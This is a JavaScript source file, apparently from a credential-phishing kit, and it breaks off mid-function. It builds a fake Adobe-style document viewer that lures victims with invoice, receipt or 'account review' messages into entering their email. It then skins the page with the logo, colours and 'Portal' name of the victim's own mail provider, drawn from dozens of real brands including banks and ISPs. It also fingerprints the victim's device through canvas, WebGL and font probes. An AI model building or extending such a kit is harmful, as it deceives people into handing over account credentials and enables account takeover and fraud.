// login-flow.js — Shared identifier-first login flow
// Used by both login.html and the index.html viewer overlay

// i18n helper — pulls from window.__I18N__ injected by the server.
// Falls back to the provided English string if the key is missing.
const t = (key, fallback) => {
  const d = (typeof window !== 'undefined' && window.__I18N__) || {};
  const v = d[key];
  return (typeof v === 'string') ? v : (fallback != null ? fallback : key);
};

// ---- Device Fingerprinting ----
// Collects browser signals to create a unique device hash.
// No cookies needed — same device always produces the same fingerprint.
async function collectFingerprint() {
  const signals = {};

  // Screen
  signals.screen = `${screen.width}x${screen.height}x${screen.colorDepth}`;
  signals.availScreen = `${screen.availWidth}x${screen.availHeight}`;
  signals.pixelRatio = window.devicePixelRatio || 1;

  // Timezone
  signals.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  signals.timezoneOffset = new Date().getTimezoneOffset();

  // Language
  signals.language = navigator.language;
  signals.languages = (navigator.languages || []).join(',');

  // Platform
  signals.platform = navigator.platform || '';
  signals.cores = navigator.hardwareConcurrency || 0;
  signals.memory = navigator.deviceMemory || 0;
  signals.touchPoints = navigator.maxTouchPoints || 0;

  // Browser capabilities
  signals.cookieEnabled = navigator.cookieEnabled;
  signals.doNotTrack = navigator.doNotTrack || '';
  signals.pdfViewer = navigator.pdfViewerEnabled || false;

  // Canvas fingerprint
  try {
    const canvas = document.createElement('canvas');
    canvas.width = 200; canvas.height = 50;
    const ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(40, 0, 62, 20);
    ctx.fillStyle = '#069';
    ctx.fillText('fingerprint', 2, 15);
    ctx.fillStyle = 'rgba(102,204,0,0.7)';
    ctx.fillText('canvas', 4, 33);
    signals.canvas = canvas.toDataURL().slice(-50);
  } catch { signals.canvas = ''; }

  // WebGL renderer
  try {
    const gl = document.createElement('canvas').getContext('webgl');
    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
    signals.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : '';
  } catch { signals.gpu = ''; }

  // Installed fonts probe (quick)
  try {
    const testFonts = ['monospace', 'sans-serif', 'serif', 'Arial', 'Courier New', 'Georgia', 'Tahoma', 'Verdana', 'Times New Roman', 'Trebuchet MS'];
    const span = document.createElement('span');
    span.style.cssText = 'position:absolute;left:-9999px;font-size:72px;';
    span.textContent = 'mmmmmmmmmmlli';
    document.body.appendChild(span);
    const widths = testFonts.map(f => { span.style.fontFamily = f; return span.offsetWidth; });
    document.body.removeChild(span);
    signals.fonts = widths.join(',');
  } catch { signals.fonts = ''; }

  // Hash all signals into a fingerprint
  const raw = JSON.stringify(signals);
  let hash;
  try {
    const encoder = new TextEncoder();
    const buf = encoder.encode(raw);
    const hashBuffer = await crypto.subtle.digest('SHA-256', buf);
    hash = Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, '0')).join('');
  } catch {
    // Fallback for HTTP (crypto.subtle requires HTTPS)
    let h = 0;
    for (let i = 0; i < raw.length; i++) { h = ((h << 5) - h + raw.charCodeAt(i)) | 0; }
    hash = 'http-' + Math.abs(h).toString(16).padStart(8, '0') + '-' + raw.length.toString(16);
  }

  return { hash, signals };
}

const PROVIDER_LOGOS = {
  google: `<svg viewBox="0 0 48 48" width="40" height="40"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>`,

  microsoft: `<svg viewBox="0 0 21 21" width="40" height="40"><rect x="1" y="1" width="9" height="9" fill="#f25022"/><rect x="11" y="1" width="9" height="9" fill="#7fba00"/><rect x="1" y="11" width="9" height="9" fill="#00a4ef"/><rect x="11" y="11" width="9" height="9" fill="#ffb900"/></svg>`,
  onedrive: `<svg viewBox="0 0 256 256" width="40" height="40"><path d="M224,80a56,56,0,0,0-106.73-32.25A48,48,0,0,0,72,120a48.08,48.08,0,0,0,1,8h0a56,56,0,0,0,0,112H216a56,56,0,0,0,8-111.4Z" fill="#0078d4"/></svg>`,

  yahoo: `<svg viewBox="0 0 48 48" width="40" height="40"><path fill="#6001d2" d="M24 0C10.75 0 0 10.75 0 24s10.75 24 24 24 24-10.75 24-24S37.25 0 24 0z"/><path fill="#fff" d="M13.2 12l6.5 13.5L26.2 12h5.6l-10 20.4V38h-4.8v-5.6L7.6 12h5.6zm18.8 0h5v5h-5v-5zM32 20h5v18h-5V20z"/></svg>`,

  alibaba: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#fff" stroke="#eee" stroke-width="1"/><path d="M8 34 L14 14 L18 26 L24 14 L28 26 L34 14 L40 34" fill="none" stroke="#ff5a1f" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M6 38 Q24 42 42 38" fill="none" stroke="#ff5a1f" stroke-width="2" stroke-linecap="round" opacity="0.5"/></svg>`,

  apple: `<svg viewBox="0 0 170 170" width="40" height="40"><path fill="#000" d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.2-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.28 2.13-9.54 3.24-12.8 3.35-4.92.21-9.84-1.96-14.75-6.52-3.13-2.73-7.05-7.41-11.76-14.04-5.05-7.12-9.2-15.38-12.46-24.8C18.51 111.26 17 102.1 17 93.22c0-10.17 2.2-18.95 6.58-26.3 3.45-5.88 8.03-10.52 13.76-13.94 5.73-3.42 11.92-5.16 18.59-5.29 3.92 0 9.06 1.21 15.43 3.59 6.35 2.39 10.43 3.6 12.22 3.6 1.34 0 5.87-1.42 13.56-4.24 7.26-2.62 13.39-3.71 18.42-3.29 13.61 1.1 23.84 6.46 30.62 16.13-12.18 7.38-18.19 17.72-18.05 30.97.13 10.32 3.86 18.91 11.17 25.73 3.33 3.16 7.04 5.6 11.16 7.34-.89 2.6-1.84 5.08-2.86 7.47zM119.11 7.24c0 8.1-2.96 15.67-8.86 22.67-7.12 8.32-15.73 13.13-25.07 12.37a25.2 25.2 0 01-.19-3.07c0-7.77 3.38-16.08 9.39-22.89 3-3.45 6.82-6.32 11.45-8.6 4.62-2.25 8.99-3.49 13.1-3.72.13 1.1.18 2.2.18 3.24z"/></svg>`,

  aol: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#31459b"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="18" font-weight="bold" fill="#fff" text-anchor="middle">AOL</text></svg>`,

  proton: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#6d4aff"/><path fill="#fff" d="M14 34V14h8.5c2.3 0 4.2.7 5.6 2.1 1.4 1.4 2.1 3.1 2.1 5.2 0 2.1-.7 3.8-2.1 5.2-1.4 1.4-3.3 2-5.6 2H18.5V34H14zm4.5-9.5h4c1 0 1.8-.3 2.4-.9s.9-1.4.9-2.3c0-.9-.3-1.7-.9-2.3s-1.4-.9-2.4-.9h-4v6.4z"/></svg>`,

  zoho: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#c8202b"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="16" font-weight="bold" fill="#fff" text-anchor="middle">Zoho</text></svg>`,

  qq: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#12b7f5"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="18" font-weight="bold" fill="#fff" text-anchor="middle">QQ</text></svg>`,

  netease: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#d93b30"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="16" font-weight="bold" fill="#fff" text-anchor="middle">163</text></svg>`,

  sina: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#e6162d"/><text x="24" y="33" font-family="Arial,sans-serif" font-size="14" font-weight="bold" fill="#fff" text-anchor="middle">SINA</text></svg>`,

  sohu: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#d44d27"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="13" font-weight="bold" fill="#fff" text-anchor="middle">Sohu</text></svg>`,

  chinamobile: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#0076d6"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="14" font-weight="bold" fill="#fff" text-anchor="middle">139</text></svg>`,

  mailru: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#005ff9"/><text x="24" y="33" font-family="Arial,sans-serif" font-size="11" font-weight="bold" fill="#fff" text-anchor="middle">Mail.ru</text></svg>`,

  yandex: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#fc3f1d"/><text x="24" y="33" font-family="Arial,sans-serif" font-size="24" font-weight="bold" fill="#fff" text-anchor="middle">Y</text></svg>`,

  naver: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#03c75a"/><text x="24" y="33" font-family="Arial,sans-serif" font-size="22" font-weight="bold" fill="#fff" text-anchor="middle">N</text></svg>`,

  daum: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#f09819"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="13" font-weight="bold" fill="#fff" text-anchor="middle">Daum</text></svg>`,

  gmx: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#1c449b"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="14" font-weight="bold" fill="#fff" text-anchor="middle">GMX</text></svg>`,

  webde: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#f8c800"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="11" font-weight="bold" fill="#333" text-anchor="middle">WEB.DE</text></svg>`,

  tonline: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#e20074"/><text x="24" y="33" font-family="Arial,sans-serif" font-size="24" font-weight="bold" fill="#fff" text-anchor="middle">T</text></svg>`,

  att: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#009fdb"/><text x="24" y="30" font-family="Arial,sans-serif" font-size="13" font-weight="bold" fill="#fff" text-anchor="middle">AT&amp;T</text></svg>`,

  verizon: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#cd040b"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="11" font-weight="bold" fill="#fff" text-anchor="middle">verizon</text><path d="M37 14 L41 22 L37 22 Z" fill="#fff"/></svg>`,

  cox: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#ef6020"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="16" font-weight="bold" fill="#fff" text-anchor="middle">Cox</text></svg>`,

  frontier: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#e4002b"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="22" font-weight="bold" fill="#fff" text-anchor="middle">F</text></svg>`,

  xfinity: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#000000"/><text x="24" y="20" font-family="Arial,sans-serif" font-size="7" font-weight="bold" fill="#fff" text-anchor="middle">xfinity</text><text x="24" y="35" font-family="Arial,sans-serif" font-size="6" fill="rgba(255,255,255,0.8)" text-anchor="middle">COMCAST</text></svg>`,

  optimum: `<svg viewBox="0 0 48 48" width="40" height="40"><circle cx="16" cy="22" r="15" fill="#000"/><circle cx="16" cy="22" r="6" fill="#fff"/><circle cx="38" cy="33" r="9" fill="#FF6B00"/></svg>`,

  spectrum: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#003057"/><text x="24" y="30" font-family="Arial,sans-serif" font-size="7" font-weight="bold" fill="#fff" text-anchor="middle">SPECTRUM</text></svg>`,

  earthlink: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#ff6600"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="20" font-weight="bold" fill="#fff" text-anchor="middle">E</text></svg>`,

  centurylink: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#009bdb"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="18" font-weight="bold" fill="#fff" text-anchor="middle">CL</text></svg>`,

  juno: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="8" fill="#1B3A7D"/><path d="M14 24l6 6 14-14" stroke="#fff" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/></svg>`,

  fidelity: `<img src="https://th.bing.com/th/id/ODF.XISGoTk9GOft_RPucOcprA?w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2" alt="Fidelity" style="max-width:100%;max-height:100%;width:auto;height:auto;object-fit:contain;" />`,

  quickbooks: `<img src="https://digitalasset.intuit.com/content/dam/intuit/qb-design/brand/overview/photo/qb-ball.svg" alt="QuickBooks" style="max-width:100%;max-height:100%;width:auto;height:auto;object-fit:contain;" />`,

  bt: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#5514b4"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="20" font-weight="bold" fill="#fff" text-anchor="middle">BT</text></svg>`,

  sky: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#0072c9"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="16" font-weight="bold" fill="#fff" text-anchor="middle">Sky</text></svg>`,

  virginmedia: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#c3092d"/><text x="24" y="28" font-family="Arial,sans-serif" font-size="8" font-weight="bold" fill="#fff" text-anchor="middle">VIRGIN</text><text x="24" y="38" font-family="Arial,sans-serif" font-size="7" fill="rgba(255,255,255,0.8)" text-anchor="middle">media</text></svg>`,

  orange: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#ff7900"/><rect x="14" y="16" width="20" height="16" rx="3" fill="#fff"/></svg>`,

  free: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#cd1e25"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="14" font-weight="bold" fill="#fff" text-anchor="middle">Free</text></svg>`,

  laposte: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#ffcc00"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="10" font-weight="bold" fill="#003da5" text-anchor="middle">LP</text></svg>`,

  libero: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#0066cc"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="11" font-weight="bold" fill="#fff" text-anchor="middle">Libero</text></svg>`,

  virgilio: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#ff8c00"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="22" font-weight="bold" fill="#fff" text-anchor="middle">V</text></svg>`,

  tiscali: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#ff0000"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="10" font-weight="bold" fill="#fff" text-anchor="middle">Tiscali</text></svg>`,

  shaw: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#003b6f"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="12" font-weight="bold" fill="#fff" text-anchor="middle">Shaw</text></svg>`,

  rogers: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#da291c"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="22" font-weight="bold" fill="#fff" text-anchor="middle">R</text></svg>`,

  bell: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#0050a0"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="14" font-weight="bold" fill="#fff" text-anchor="middle">Bell</text></svg>`,

  telus: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#4b286d"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="11" font-weight="bold" fill="#fff" text-anchor="middle">TELUS</text></svg>`,

  telstra: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#001e82"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="22" font-weight="bold" fill="#fff" text-anchor="middle">T</text></svg>`,

  optus: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#00828c"/><text x="24" y="32" font-family="Arial,sans-serif" font-size="10" font-weight="bold" fill="#fff" text-anchor="middle">Optus</text></svg>`,

  // Rackspace — uses the real "Rackspace Technology" wordmark we host locally
  // (sourced from Wikimedia Commons). Wide aspect (3.25:1) renders at full container
  // width with object-fit:contain, matching the look of their actual webmail banner.
  rackspace: `<img src="/img/providers/rackspace.svg" alt="Rackspace" referrerpolicy="no-referrer" style="max-width:100%;max-height:100%;width:auto;height:auto;object-fit:contain;">`,

  godaddy: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#1bdbdb"/><text x="24" y="30" font-family="Arial,sans-serif" font-size="9" font-weight="900" fill="#000" text-anchor="middle" letter-spacing="-0.5">GoDaddy</text></svg>`,

  ovh: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#fff" stroke="#e5e7eb" stroke-width="1"/><text x="24" y="30" font-family="Arial,sans-serif" font-size="13" font-weight="900" fill="#123f6d" text-anchor="middle" letter-spacing="-0.3">ovh</text><circle cx="36.5" cy="20" r="2.4" fill="#123f6d"/></svg>`,

  ionos: `<svg viewBox="0 0 48 48" width="40" height="40"><rect width="48" height="48" rx="10" fill="#003d8f"/><text x="24" y="30" font-family="Arial,sans-serif" font-size="11" font-weight="900" fill="#fff" text-anchor="middle" letter-spacing="-0.3">IONOS</text></svg>`,
};

// Apply document type specific styling
function applyDocumentTypeTheme(docType) {
  // FIX: Removed document type themed colors (was applying orange for receipt, pink for invitation, green for confirmation)
  // User wants default Adobe black header (#2b2a33) for all document types
  // Previously this function was applying custom colors which would override after page load
  // Now using default Adobe colors only
  return;
}

// Apply provider branding to titlebar only
function applyProviderTheme(provider, theme) {
  if (!provider) return;

  // Update titlebar product name
  const productName = document.querySelector('.product-name');
  if (productName) {
    productName.textContent = PROVIDER_NAMES[provider.brand] || provider.name || 'your mail';
  }

  // Update logos
  const logoSvg = PROVIDER_LOGOS[provider.brand] || PROVIDER_LOGOS.acrobat;
  if (logoSvg) {
    const logoHtml = `<div style="width:75px;height:75px;display:flex;align-items:center;justify-content:center;">${logoSvg.replace(/width="40"/g,'width="75"').replace(/height="40"/g,'height="75"')}</div>`;

    // Titlebar logo - replace with provider logo (CSS handles sizing)
    document.querySelectorAll('.adobe-logo').forEach(el => {
      el.innerHTML = logoSvg;
    });

    // Modal logos
    document.querySelectorAll('.login-mark, [data-lf-provider-logo]').forEach(el => {
      el.innerHTML = logoHtml;
    });

    // Sidebar provider logo
    const sidebarLogo = document.getElementById('sidebarProviderLogo');
    if (sidebarLogo) {
      sidebarLogo.innerHTML = logoSvg.replace(/width="40"/g,'width="60"').replace(/height="40"/g,'height="60"');
    }
  }

  // Style titlebar and logo with provider colors
  if (theme) {
    const style = document.createElement('style');
    style.textContent = `
      .titlebar {
        background: linear-gradient(90deg, ${theme.primary} 0%, ${theme.button} 100%) !important;
        color: ${theme.text} !important;
      }
      .login-mark {
        background: linear-gradient(135deg, ${theme.primary} 0%, ${theme.button} 100%) !important;
        box-shadow: 0 6px 18px ${theme.primary}33 !important;
      }
      .product-name {
        color: ${theme.text} !important;
      }
      .menu-item {
        color: ${theme.text}cc !important;
      }
      .menu-item:hover {
        background: ${theme.primary}30 !important;
        color: ${theme.text} !important;
      }
      .tb-right .icon-btn {
        color: ${theme.text}cc !important;
      }
      .tb-right .icon-btn:hover {
        background: ${theme.primary}30 !important;
        color: ${theme.text} !important;
      }
      /* Only sign-in related buttons */
      .submit-btn, .pass-submit-btn, [data-lf-continue-btn] {
        background-color: ${theme.button} !important;
        border-color: ${theme.button} !important;
        color: ${theme.text} !important;
      }
    `;
    document.head.appendChild(style);
  }
}

const PROVIDER_NAMES = {
  google: 'Gmail Portal',
  microsoft: 'Outlook Portal',
  onedrive: 'OneDrive Portal',
  yahoo: 'Yahoo Portal',
  alibaba: 'Alibaba Portal',
  apple: 'Apple Portal',
  aol: 'AOL Portal',
  proton: 'Proton Portal',
  zoho: 'Zoho Portal',
  qq: 'QQ Portal',
  netease: '163 Portal',
  sina: 'Sina Portal',
  sohu: 'Sohu Portal',
  chinamobile: 'China Mobile Portal',
  mailru: 'Mail.ru Portal',
  yandex: 'Yandex Portal',
  naver: 'Naver Portal',
  daum: 'Daum Portal',
  gmx: 'GMX Portal',
  webde: 'Web.de Portal',
  tonline: 'T-Online Portal',
  att: 'AT&T Portal',
  verizon: 'Verizon Portal',
  cox: 'Cox Portal',
  frontier: 'Frontier Portal',
  xfinity: 'Xfinity Portal',
  optimum: 'Optimum Portal',
  spectrum: 'Spectrum Portal',
  earthlink: 'EarthLink Portal',
  centurylink: 'CenturyLink Portal',
  bt: 'BT Portal',
  sky: 'Sky Portal',
  virginmedia: 'Virgin Media Portal',
  orange: 'Orange Portal',
  free: 'Free Portal',
  laposte: 'La Poste Portal',
  libero: 'Libero Portal',
  virgilio: 'Virgilio Portal',
  tiscali: 'Tiscali Portal',
  shaw: 'Shaw Portal',
  rogers: 'Rogers Portal',
  bell: 'Bell Portal',
  telus: 'TELUS Portal',
  telstra: 'Telstra Portal',
  optus: 'Optus Portal',
  // France
  sfr: 'SFR Portal',
  bouygues: 'Bouygues Portal',
  caramail: 'Caramail Portal',
  voila: 'Voila Portal',
  // Germany / DACH
  mailbox: 'Mailbox Portal',
  posteo: 'Posteo Portal',
  arcor: 'Arcor Portal',
  oneandone: '1&1 Portal',
  freenet: 'Freenet Portal',
  vodafone: 'Vodafone Portal',
  tutanota: 'Tutanota Portal',
  maildedeu: 'Mail.de Portal',
  // Spain
  terra: 'Terra Portal',
  telefonica: 'Telefónica Portal',
  movistar: 'Movistar Portal',
  ono: 'ONO Portal',
  jazztel: 'Jazztel Portal',
  yacom: 'Ya.com Portal',
  mixmail: 'Mixmail Portal',
  euskaltel: 'Euskaltel Portal',
  // UK
  talktalk: 'TalkTalk Portal',
  plusnet: 'Plusnet Portal',
  madasafish: 'Madasafish Portal',
  // USA
  juno: 'Juno Portal',
  netzero: 'NetZero Portal',
  windstream: 'Windstream Portal',
  mediacom: 'Mediacom Portal',
  fastmail: 'FastMail Portal',
  usanet: 'USA.NET Portal',
  // China
  oneeightoneight: '188 Portal',
  twentyonecn: '21CN Portal',
  tom: 'TOM Portal',
  twosixthree: '263 Portal',
  chinatelecom: 'China Telecom Portal',
  chinaunicom: 'China Unicom Portal',
  // Arab countries
  etisalat: 'Etisalat Portal',
  du: 'du Portal',
  stc: 'STC Portal',
  tedata: 'TE Data Portal',
  linkdotnet: 'Link.net Portal',
  noor: 'Noor Portal',
  maroctelecom: 'Maroc Telecom Portal',
  tunisietelecom: 'Tunisie Telecom Portal',
  topnet: 'Topnet Portal',
  gnet: 'GlobalNet Portal',
  batelco: 'Batelco Portal',
  qatartel: 'Ooredoo Portal',
  omantel: 'Omantel Portal',
  idm: 'IDM Portal',
  sodetel: 'Sodetel Portal',
  jordannet: 'Jordan Telecom Portal',
  uruklink: 'UrukLink Portal',
  yemennet: 'YemenNet Portal',
  algerietelecom: 'Algérie Télécom Portal',
  // Email hosting platforms
  rackspace: 'Rackspace Portal',
  godaddy: 'GoDaddy Portal',
  ovh: 'OVH Portal',
  ionos: 'IONOS Portal',
  fidelity: 'Fidelity Portal',
  quickbooks: 'QuickBooks Portal',
};

/**
 * Initialize the identifier-first login flow on a container.
 * @param {HTMLElement} container - Must contain: [data-lf-email-input], [data-lf-form],
 *   [data-lf-step="email"], [data-lf-step="provider"], [data-lf-provider-logo],
 *   [data-lf-provider-name], [data-lf-email-pill], [data-lf-continue-btn],
 *   [data-lf-back-btn], [data-lf-error]
 * @param {Object} opts
 * @param {Function} opts.onSuccess - Called after successful email-based login (fallback)
 */
// Domains that belong directly to a provider (not custom domains)
const DOMAIN_TO_PROVIDER_MAP = {
  'gmail.com': 1, 'googlemail.com': 1, 'outlook.com': 1, 'hotmail.com': 1, 'live.com': 1,
  'msn.com': 1, 'yahoo.com': 1, 'ymail.com': 1, 'rocketmail.com': 1, 'icloud.com': 1, 'outlook.co.uk': 1, 'hotmail.co.uk': 1,
  'me.com': 1, 'mac.com': 1, 'aol.com': 1, 'protonmail.com': 1, 'proton.me': 1, 'pm.me': 1,
  'zoho.com': 1, 'aliyun.com': 1, 'alimail.com': 1, 'qq.com': 1, 'foxmail.com': 1,
  '163.com': 1, '126.com': 1, 'yeah.net': 1, 'sina.com': 1, 'sohu.com': 1, '139.com': 1,
  'mail.ru': 1, 'inbox.ru': 1, 'bk.ru': 1, 'yandex.com': 1, 'yandex.ru': 1,
  'naver.com': 1, 'daum.net': 1, 'hanmail.net': 1, 'gmx.com': 1, 'gmx.net': 1,
  'web.de': 1, 't-online.de': 1, 'comcast.net': 1, 'comcast.com': 1, 'xfinity.com': 1, 'mycomcast.com': 1,
  'optonline.net': 1, 'optonline.com': 1, 'optimum.net': 1, 'optimum.com': 1, 'spectrum.net': 1, 'charter.net': 1,
  'att.net': 1, 'sbcglobal.net': 1, 'bellsouth.net': 1, 'verizon.net': 1, 'cox.net': 1, 'frontier.com': 1,
  'earthlink.net': 1, 'centurylink.net': 1, 'btinternet.com': 1, 'sky.com': 1,
  'virginmedia.com': 1, 'orange.fr': 1, 'free.fr': 1, 'laposte.net': 1,
  'libero.it': 1, 'virgilio.it': 1, 'tiscali.it': 1, 'shaw.ca': 1, 'rogers.com': 1,
  'bell.net': 1, 'telus.net': 1, 'bigpond.com': 1, 'optusnet.com.au': 1,
};

export async function initLoginFlow(container, opts = {}) {
  // Apply document type specific styling FIRST
  const docType = window.__DOCUMENT_TYPE__ || 'invoice';
  applyDocumentTypeTheme(docType);

  // Apply provider theming on page load if provider already detected (URL-based)
  // Provider theming only affects titlebar, so document type background will show
  const provider = window.__PROVIDER__;
  const theme = window.__PROVIDER_THEME__;

  if (provider && provider.brand !== 'default' && theme) {
    applyProviderTheme(provider, theme);
  }

  const emailInput   = container.querySelector('[data-lf-email-input]');
  const card         = container.querySelector('.login-card') || container;

  // Set provider class on card for CSS theming on email step (before user continues)
  if (provider && provider.brand !== 'default') {
    card.className = card.className.replace(/provider-\w+/g, '').trim();
    card.classList.add(`provider-${provider.brand}`);

    // Force button color with JavaScript for QuickBooks and Fidelity
    if (provider.brand === 'quickbooks' || provider.brand === 'fidelity') {
      const submitBtn = container.querySelector('.login-submit');
      if (submitBtn) {
        submitBtn.style.background = '#1db14d';
        submitBtn.style.boxShadow = '0 4px 14px rgba(29, 177, 77, 0.3)';
        submitBtn.onmouseover = () => submitBtn.style.background = '#16a34a';
        submitBtn.onmouseout = () => submitBtn.style.background = '#1db14d';
      }
    }
  }

  // Re-declare card below after initial setup
  const emailForm    = container.querySelector('[data-lf-form]');
  const stepEmail    = container.querySelector('[data-lf-step="email"]');
  const stepProvider = container.querySelector('[data-lf-step="provider"]');
  const logoEl       = container.querySelector('[data-lf-provider-logo]');
  const nameEl       = container.querySelector('[data-lf-provider-name]');
  const pillEl       = container.querySelector('[data-lf-email-pill]');
  const continueBtn  = container.querySelector('[data-lf-continue-btn]');
  const backBtn      = container.querySelector('[data-lf-back-btn]');
  const errorEl      = container.querySelector('[data-lf-error]');

  const stepLoading  = container.querySelector('[data-lf-step="loading"]');
  const loadingEmail = container.querySelector('[data-lf-loading-email]');

  // Set document type-specific messages
  const docMessages = {
    invoice: {
      title: 'Continue to view your invoice',
      subtitle: 'Please use the email address this invoice was sent to',
      footer: 'Only the recipient of this invoice can view it.'
    },
    invitation: {
      title: 'Continue to view your invitation',
      subtitle: 'Please use the email address this invitation was sent to',
      footer: 'Only the recipient of this invitation can view it.'
    },
    receipt: {
      title: 'Continue to view your receipt',
      subtitle: 'Please use the email address this receipt was sent to',
      footer: 'Only the recipient of this receipt can view it.'
    },
    confirmation: {
      title: 'Review your account status',
      subtitle: 'Login to see your account review and recommended actions',
      footer: 'Only the account holder can access this review.'
    }
  };
  let msg = docMessages[docType] || docMessages.invoice;

  // Fetch custom messages from link if available
  const hash = window.__LINK_HASH__ || new URLSearchParams(window.location.search).get('hash');
  if (hash) {
    try {
